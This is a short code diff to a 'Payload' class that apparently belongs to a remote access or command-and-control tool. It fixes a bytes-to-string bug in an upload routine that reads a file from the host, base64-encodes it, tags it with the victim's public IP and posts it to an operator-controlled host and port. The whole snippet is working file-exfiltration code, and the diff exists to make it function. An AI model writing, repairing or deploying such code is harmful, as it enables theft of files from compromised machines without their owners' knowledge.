@@ -639,7 +639,9 @@ class Payload():
                 _, filetype = os.path.splitext(filename)
                 with open(filename, 'rb') as fp:
                     data = base64.b64encode(fp.read())
-                json_data = {'data': str(data), 'filename': filename, 'type': filetype, 'owner': self.owner, "module": self.upload.__name__, "session": self.info.get('public_ip')}
+                # decode bytes into a utf-8 encoded string
+                datastr = data.decode('utf-8')
+                json_data = {'data': datastr, 'filename': filename, 'type': filetype, 'owner': self.owner, "module": self.upload.__name__, "session": self.info.get('public_ip')}
                 globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
                 return "Upload complete"
             else:
